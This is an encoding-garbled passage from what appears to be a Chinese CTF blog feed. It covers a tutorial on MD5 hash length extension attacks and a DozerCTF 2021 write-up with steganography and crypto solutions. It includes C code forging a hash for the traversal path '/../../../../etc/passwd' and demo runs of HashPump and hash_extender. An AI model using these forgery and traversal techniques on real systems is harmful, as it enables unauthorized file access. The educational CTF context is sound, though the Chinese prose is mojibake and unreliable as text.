ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚è¿™ä¸ªé—®é¢˜å®é™…ä¸Šå˜æˆäº†ï¼š<strong>å¦‚ä½•åœ¨ä¸çŸ¥é“ salt/key/secret çš„æƒ…å†µä¸‹ï¼Œè®¡ç®—å‡ºä¸€ä¸ªæ–‡ä»¶åçš„åˆæ³• hash å€¼</strong>ã€‚</p><p>é€šè¿‡å‰é¢å¯¹ md5 ç®—æ³•çš„äº†è§£ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå½“ä¸€ä¸ªå—è®¡ç®—å®Œæˆåï¼ŒABCD å››ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼å°±æ˜¯åˆšè®¡ç®—å®Œçš„ hash å€¼ï¼Œå¦‚æœåé¢è¿˜æœ‰æ•°æ®å—ï¼Œé‚£ä¹ˆä¼šåœ¨å·²æœ‰çš„ ABCD å››ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼ä¸Šè¿›è¡Œæ›´æ–°ã€‚</p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å°† ABCD å››ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼è®¾ç½®ä¸º test.pdf å¯¹åº”çš„ hash å€¼ï¼Œé‚£ä¹ˆå°±ç›¸å½“äº MD5 çš„è®¡ç®—è¿‡ç¨‹ä¸­ï¼Œå·²ç»å®Œæˆäº†å¯¹å‰ä¸€ä¸ªå—çš„è®¡ç®—ï¼Œæ¥ç€å‘ä¸‹è®¡ç®—å°±å¯ä»¥äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[MD5_DIGEST_LENGTH];</span><br><span class="line">  MD5_CTX c;</span><br><span class="line"></span><br><span class="line">  MD5_Init(&amp;c);</span><br><span class="line">  MD5_Update(&amp;c, <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>, <span class="number">64</span>);</span><br><span class="line">  c.A = <span class="number">0x9b104365</span>;</span><br><span class="line">  c.B = <span class="number">0xf78738b5</span>;</span><br><span class="line">  c.C = <span class="number">0x42fe46bb</span>;</span><br><span class="line">  c.D = <span class="number">0x4ae2264f</span>;</span><br><span class="line">  MD5_Update(&amp;c, <span class="string">&quot;/../../../../etc/passwd&quot;</span>, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">  MD5_Final(buffer, &amp;c);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, buffer[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡Œé¢çš„ 64 ä¸ª A æ— æ‰€è°“æ˜¯ä»€ä¹ˆï¼Œåªæ˜¯ä¸ºäº†è®© MD5 è¿›è¡Œä¸€ä¸ªå—çš„è®¡ç®—ï¼Œç„¶åæˆ‘ä»¬å°†å››ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼æ”¹æ‰ï¼Œæ³¨æ„å¤§å°ç«¯ã€‚ç„¶åè®¡ç®—é™„åŠ æ•°æ®çš„ MD5ã€‚</p><p><strong>å·¥å…·</strong></p><ul><li><p>HashPumpï¼š<a href="https://github.com/bwall/HashPump">https://github.com/bwall/HashPump</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump -h</span><br><span class="line">HashPump [-h <span class="built_in">help</span>] [-t <span class="built_in">test</span>] [-s signature] [-d data] [-a additional] [-k keylength]</span><br><span class="line">    HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</span><br><span class="line">    -h --<span class="built_in">help</span>          Display this message.</span><br><span class="line">    -t --<span class="built_in">test</span>          Run tests to verify each algorithm is operating properly.</span><br><span class="line">    -s --signature     The signature from known message.</span><br><span class="line">    -d --data          The data from the known message.</span><br><span class="line">    -a --additional    The information you would like to add to the known message.</span><br><span class="line">    -k --keylength     The length <span class="keyword">in</span> bytes of the key being used to sign the original message with.</span><br><span class="line">    Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</span><br><span class="line">    &lt;Developed by bwall(@botnet_hunter)&gt;</span><br><span class="line">    </span><br><span class="line">$ hashpump -s <span class="string">&#x27;6d5f807e23db210bc254a28be2d6759a0f5f5d99&#x27;</span> --data <span class="string">&#x27;count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo&#x27;</span> -a <span class="string">&#x27;&amp;waffle=liege&#x27;</span> -k 14</span><br><span class="line">0e41270260895979317fff3898ab85668953aaa2</span><br><span class="line">count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&amp;waffle=liege</span><br></pre></td></tr></table></figure></li><li><p>hash_extenderï¼š<a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let secret = &quot;secret&quot;</span><br><span class="line">let data = &quot;data&quot;</span><br><span class="line">let H = md5()</span><br><span class="line">let signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b</span><br><span class="line">let append = &quot;append&quot;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5</span><br><span class="line">Type: md5</span><br><span class="line">Secret length: 6</span><br><span class="line">New signature: 6ee582a1669ce442f3719c47430dadee</span><br><span class="line">New string: 64617461800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000617070656e64</span><br></pre></td></tr></table></figure></li><li><p>hexpandï¼š<a href="https://github.com/amlweems/hexpand">https://github.com/amlweems/hexpand</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">hexpand -t <span class="built_in">type</span> -s signature -l length -m message</span><br><span class="line">hexpand --<span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-t --<span class="built_in">type</span>the <span class="built_in">hash</span> algorithm <span class="keyword">for</span> expansion (md5, sha1, sha256, or sha512</span><br><span class="line">-s --sigthe result of the original <span class="built_in">hash</span> <span class="keyword">function</span></span><br><span class="line">-l --lengththe length of the original message</span><br><span class="line">-m --messagethe message to be appended</span><br><span class="line">--<span class="built_in">test</span>runs a <span class="built_in">set</span> of <span class="built_in">test</span> cases</span><br><span class="line"></span><br><span class="line"> $ ./hexpand -t md5 -s cd9fb5c3a20e29b2b2846deaa845c426 -l 55 -m <span class="string">&quot;\nP.S. Tell Eve our secret plan&quot;</span></span><br><span class="line">Append (hex): 80b8010000000000005c6e502e532e2054656c6c20457665206f75722073656372657420706c616e2e</span><br><span class="line">Signature:    69b0e397b5588c86aa9751b56f2c6943</span><br></pre></td></tr></table></figure></li></ul><p><strong>å‚è€ƒ</strong></p><p><a href="https://lightless.me/archives/hash-extender-attack.html">å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;h2 id=&quot;å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»&quot;&gt;&lt;a href=&quot;#å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»&quot; class=&quot;headerlink&quot; title=&quot;å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»&quot;&gt;&lt;/a&gt;å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;åŸç†&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨å¯†ç å­¦å’Œè®¡</summary>
      
    
    
    
    <category term="crypto" scheme="https://lazzzaro.github.io/categories/crypto/"/>
    
    
    <category term="hash" scheme="https://lazzzaro.github.io/tags/hash/"/>
    
  </entry>
  
  <entry>
    <title>DozerCTF 2021</title>
    <link href="https://lazzzaro.github.io/2021/05/30/match-DozerCTF-2021/"/>
    <id>https://lazzzaro.github.io/2021/05/30/match-DozerCTF-2021/</id>
    <published>2021-05-30T14:23:15.000Z</published>
    <updated>2021-05-30T16:54:45.628Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><blockquote><p>æ¯”èµ›æ—¶é—´ï¼š2021å¹´5æœˆ29æ—¥ 9:00-2021å¹´5æœˆ30æ—¥æ™š21:30<br>æ¯”èµ›å¹³å°ï¼š<a href="http://1.14.160.21:8000/">http://1.14.160.21:8000/</a></p></blockquote><p>Webå‡ ä¹å…¨æ˜¯åŸŸæ¸—é€ï¼ŒCryptoå‡ ä¹å…¨æ˜¯AESã€‚</p><p>Rank: 12</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§"><a href="#ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§" class="headerlink" title="ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§"></a>ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§</h3><blockquote><p>æ¬¢è¿å‚åŠ DozerCTF 2021 <a href="https://www.bilibili.com/video/BV1VK4y1G7HQ">https://www.bilibili.com/video/BV1VK4y1G7HQ</a></p></blockquote><p>è§†é¢‘ä¸­åæ®µæœ‰é—ªè¿‡çš„flagï¼Œæ‹¼æ‰‹é€Ÿæš‚åœå¤§æ³•ã€‚</p><p>â€‹    </p><h3 id="detective-novel"><a href="#detective-novel" class="headerlink" title="detective_novel"></a>detective_novel</h3><blockquote><p>å¬è¯´æ‰«ä¸€æ‰«å°±æœ‰flag</p></blockquote><p>flag.png åˆ†ç¦»å‡º zipå‹ç¼©åŒ…ï¼Œåœ¨ novel ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ flag.jpg å’Œ hint.pngã€‚</p><p>hint.png åˆ†ç¦»å‡ºå¦ä¸€ä¸ª zipå‹ç¼©åŒ…ï¼Œæ£€æŸ¥å‘ç°å¤´éƒ¨é”™è¯¯ä¸”åŒ…å«ä¼ªåŠ å¯†ï¼Œä¿®å¤å¤´éƒ¨ <code>504B03040A000900</code> ä¸º <code>504B030414000000</code> ï¼Œåœ¨ easy_riddle ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ hint.txt å’Œ letter.pngã€‚</p><p>letter.png ç¦å°”æ‘©æ–¯ä½¿ç”¨è¿‡çš„è·³èˆå°äººå¯†ç ï¼Œè§£å‡º <code>DOZER</code>ï¼Œå†ç»“åˆä¹‹å‰ hint.png å†…æ–‡å­— <code>guess what can you get !!!</code>ï¼Œç”¨ outguess ä» flag.jpg æå–æ–‡ä»¶å¾—flagï¼š</p><p><code>outguess -r flag.jpg -k DOZER -t out.txt</code></p><p>â€‹    </p><h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><blockquote><p>çœ‹ä¸åˆ°çœ‹ä¸åˆ°</p></blockquote><p>xiaojiejie.jpg åˆ†ç¦»å‡ºä¸€å¼ gifå›¾ç‰‡å’Œä¸€å¼ pngå›¾ç‰‡ã€‚</p><p>gifå›¾ç‰‡åˆ†å¸§åˆ†åˆ«æ‰«äºŒç»´ç æ‹¼æ¥å¾—å‰åŠæ®µ <code>Dozer&#123;is_it_simple</code>ï¼ŒpngäºŒç»´ç å›¾ç‰‡æ‰«ç å‘ç°æ–‡å­—ä¸­é—´æœ‰ä¸å¯è§å­—ç¬¦ï¼ŒçŒœæµ‹ä¸ºé›¶å®½éšå†™ï¼Œä½¿ç”¨ <a href="http://330k.github.io/misc_tools/unicode_steganography.js">unicode_steganography</a> æå–å­—ç¬¦ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = unicodeSteganographer</span><br><span class="line">s.setUseChars(<span class="string">&#x27;\u200b\u200c\u200d\u200e\u200f&#x27;</span>);</span><br><span class="line">s.decodeText(<span class="string">&quot;æˆ‘å·²ç»çœ‹è§äº†ï¼Œâ€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€‹â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€Œâ€Œâ€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€‹â€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€Œâ€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€‹â€Œâ€‹â€‹â€‹â€Œâ€‹â€‹â€‹ä½ å‘¢ï¼Ÿ&quot;</span>)</span><br></pre></td></tr></table></figure><p>è§£å‡ºååŠæ®µ <code>_for_you!congratulate&#125;</code></p><p>â€‹    </p><h3 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h3><blockquote><p>å¬è¯´å›½èµ›æœ‰ä¸€ä¸ªrunning_pixel?</p></blockquote><p>æŒ‰æç¤ºå‚è€ƒciscné¢˜ï¼Œæå–218å¼ å›¾ç‰‡é‡Œçš„0/1ï¼Œå¯æŒ‰ç…§0/1å›¾æ¡ˆé¢œè‰²ï¼ˆRGB: EFEF27ï¼‰è®¡ç®—åƒç´ æ•°æ¥è¯†åˆ«ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">219</span>):</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">framepic = Image.<span class="built_in">open</span>(<span class="string">f&quot;./funny_pixel/<span class="subst">&#123;name&#125;</span>.png&quot;</span>)</span><br><span class="line">framepic = framepic.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">width,height = framepic.size</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line"><span class="keyword">if</span> framepic.getpixel((w,h)) == (<span class="number">0xef</span>,<span class="number">0xef</span>,<span class="number">0x27</span>):</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>((name,count))</span><br><span class="line"><span class="keyword">if</span> count != <span class="number">10</span> <span class="keyword">and</span> count != <span class="number">5</span>:</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">flag += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> count == <span class="number">10</span> <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#01000100011011110111101001100101011100100100001101010100010001100111101101000100001100000101111101111001010011110101010101011111010011000100100101101011011001010101111101010000011010010111100001000101011011000111110111</span></span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿå¾—åˆ°çš„0/1å­—ç¬¦ä¸²ï¼Œ<code>1000100 = D</code>ï¼Œ<code>1101111 = o</code>ï¼Œç±»æ¨çŸ¥æ¯ä¸ªå­—ç¬¦7ä½äºŒè¿›åˆ¶ä¸­é—´ç”¨0åˆ†éš”ï¼Œæå–è½¬å›å­—ç¬¦å³ä¸ºflagï¼š<code>DozerCTF&#123;D0_yOU_LIke_PixEl&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ä¸€ç‚¹ä¹Ÿä¸æ‚"><a href="#ä¸€ç‚¹ä¹Ÿä¸æ‚" class="headerlink" title="ä¸€ç‚¹ä¹Ÿä¸æ‚"></a>ä¸€ç‚¹ä¹Ÿä¸æ‚</h3><blockquote><p>å‡ºé¢˜äººè¯´ï¼Œè¿™ä¸ªé¢˜ç›®ä¸€ç‚¹ä¹Ÿä¸æ‚</p></blockquote><p>ä¸‰ä¸ªæ–‡ä»¶ï¼Œflagåˆ†ä¸‰éƒ¨åˆ†ã€‚</p><p>ç¬¬ä¸€éƒ¨åˆ†ï¼Œ5æœˆæ—¥å†+å›¾ç‰‡å°¾éƒ¨13ç»„æ•°å­—ï¼Œåœ¨æ—¥å†ä¸Šè¿çº¿å‡ºçŒªåœˆå¯†ç å›¾æ¡ˆï¼Œå¯¹ç…§è§£å‡º <code>DOYOUKNOW_CRT</code>ã€‚</p><p>ç¬¬äºŒéƒ¨åˆ†ï¼Œç®€å•ä¸­å›½å‰©ä½™å®šç†(CRT)åº”ç”¨ï¼ŒSageè¿è¡Œ<code>crt([2,2,9,16],[5,7,17,23])</code>ï¼Œå¾—key=5007ã€‚</p><p>ç¬¬ä¸‰éƒ¨åˆ†ï¼Œç›´æ¥base85è§£ç å¾— <code>_good_over&#125;</code></p><p>åŠ å¤´ <code>DozerCTF&#123;</code> æ‹¼æ¥ä¸ºflagã€‚</p><p>â€‹    </p><h3 id="åšä¸ªé—®å·å§"><a href="#åšä¸ªé—®å·å§" class="headerlink" title="åšä¸ªé—®å·å§"></a>åšä¸ªé—®å·å§</h3><blockquote><p>èµ›é¢˜åŸºæœ¬ä¸Šçº¿å®Œæ¯•ï¼Œæ„Ÿè°¢å‚åŠ DozerCTF 2021! é—®å·ï¼š<a href="https://tp.wjx.top/vj/t2bF3sc.aspx">https://tp.wjx.top/vj/t2bF3sc.aspx</a></p></blockquote><p>åé¦ˆ+åæ§½ã€‚</p><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Horcrux"><a href="#Horcrux" class="headerlink" title="Horcrux"></a>Horcrux</h3><blockquote><p>Harry Potter &amp;&amp; Aquila</p></blockquote><p>AeroCTF 2021åŸé¢˜ï¼Œæ„é€ ç»“å¼è§£æ¤­åœ†æ›²çº¿æ–¹ç¨‹ç»„+LLLç®—æ³•+æ¢å¤å‚æ•°å€¼ï¼Œå‚è€ƒï¼š</p><p><a href="https://gist.github.com/hellman/a8c9a09b1ce6959226f9d75cf94b805f">AeroCTF 2021 - Horcrux</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">proof.arithmetic(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x95a599ab706381e861caf2c6e757204c704b77a38592ae0db282000d8537ab0e4608ecd9a524ad6e14eb9564353b5c1036ff13c8503bfad7e8695d0bcf15df766c1be64aa4e73b75e0ecb28ea9e74eafc613d2fb9299fac060826bd071a92d2bd5be44d6d65e6b63146d617e800b79e25358b4a3e22a62457f2d39c21a694f54c03ad5d69a674fa6cd91c2971524152c1b6d177c455e0f255ce4fa18253da252613959c17b49ac422a9009933d0c59210646fca85e8ae35d5df34d6afde9d951909585c3f3e53e06ef5ae319fa035e57941599c2a73133bba490b66ab38e7537fd3ed322bf3a0431f02f276b5b18b623865883e3f0b67a511293b5a7576c97e6663cb1c32bdff5cda825549742d067e1b4ca847c75ef6b601feced3a9bb4dea41f1e5c40a8f2af2983f010d7bbc9ba992cedcdac6922a056d52873af110ae578da5e875fa6a121cdb45fe5e8198c121f7e9609d100d023a9155d6aa9efe28aa9036079564780db663aad36796ee8349b98b11d1b108125</span></span><br><span class="line">F = GF(p)</span><br><span class="line"></span><br><span class="line">x0 = F(<span class="number">0x93436a2bdfecc923d69385f164ef891ef5b08418e5b4e65c980e0b054e86ee8b8e24a527dad9fe3883234179167ada4b5f413c07c548f3dc224db1f2791c8a44bb857c722676d621fa07ad4beee4dc2be679c351cc19423aaff444e5c908b767d9ebec006bf0f020b8c0d15775fc84524333c47d4bc46ae8bd3cb18e1b037e59a388e39a81c1d97c9654742979ed54741df9aba6954c2801efb63d91ed1a51889ee1e8848b7bf111c987cb558e08b9caa17e50f578fa0af70bf855393dcc6c52420897eae663700818dbec237e094c1d4904a249d92702ab4046e52694db73a5fb83953262dff0251fa5fd1b4a99fb70addcde2a38d8766e02360b7b29aad1382ecdd63650f2b597469267dccc11ee7d0b10178c68a02b2d03db5bfcd6d663c11bc2ef855e30528aec48a9f4f53f71c52ac6e0c92fcaf0f8576982b1135bbb15fb5035c7853de51b8aa5b858646dd23b7b01d837c6b3c38f4bdcef6009ee02456bbdcbe8978eb400326c4fd0a899ed9f559ba963b25317</span>)</span><br><span class="line">y0 = F(<span class="number">0x47b8c9d33929bfe12657a2f482213cca803fe37e8485ebde814dc91ce56ed480cea04f24176edce77ebfd7d9bba3a864cfe6176ef1d68ebc184dcde0667704adc472d1d16688affa657cff460edf05f92dad743ca3421150ec7ef98e08a9d17af033a555ed49f0e9c7457bf339a9270e8b44b7b75dd43afd27614d0ce59878c019d902d9ed23a26f04a431130534f85b05db586fd9a65a178204eb7d568a0e64dd16a369d2af6f2b8cd32a9e9be8322885c78a30dc8019ca3c48f39bad38de4ab60970ee1c44688d2afa901f46af7d2e7ced0e34204d6b38330fd87d6bf5bb61378e092780a48b985654de1c65b0a6146a82f84bfe09359820942980ce5c607bfc14497a79436bc4f351ae697875d93049c30dafc698208a17f9b785aa35448e4ef341102053c62a9923287f4cf597ff492fd0eac4ef77ae879a22c6c8a3a53baef09f574316fd872e1a6dd1ad9eb72a3e39f925e25fe06f7983b785dcb110bd127c8e2736e7345fd7ffce687c66c492a541e00c500574</span>)</span><br><span class="line">x1 = F(<span class="number">0x37a181d88a683e2eeba3147bfb3043be6067fc722b8578255e25a335fadda9ead31c41d7742dbf3df7e4c3effc9297ef528730b3d8920978e342e123b9f19ab15a5ed2c19c45aaee728e53acd8c44e7543c4b9bcd40f27b8efac1a1e431ddbab15b4341c6cc817516634c2ab1117e784e429b9f797963b18442127342455d469ca9d9ff24b241afe9b7fdd4b91bb9750710e6f00b9fe631c1db71c308ef4642251fc00d0433910161d588c100944d55935ddf7dc656cc1670065c5bc6607358304c228f8495cca579a3a78102b4e617687f3aad0c5826e3aa7a85c85c99af2254002d3578c0af342ea1f49b9a425eba90e2473470fec77a945b45cf67dde9cb4e0ef445b974164cbcb61ec7cbcd77c94d42c6dce15ae500e4b6b15d38923ba2773176ae1e3354baaae47b422ec0ff8273538ad0a6a03a33d60a52257698130f6db6baaa4d338e167443eb4ac1b57b0d6f424e9d0b2f6b6b0df609b81150928286443afe7d1b9bbb30389af0db1597945d233cd19121d11</span>)</span><br><span class="line">y1 = F(<span 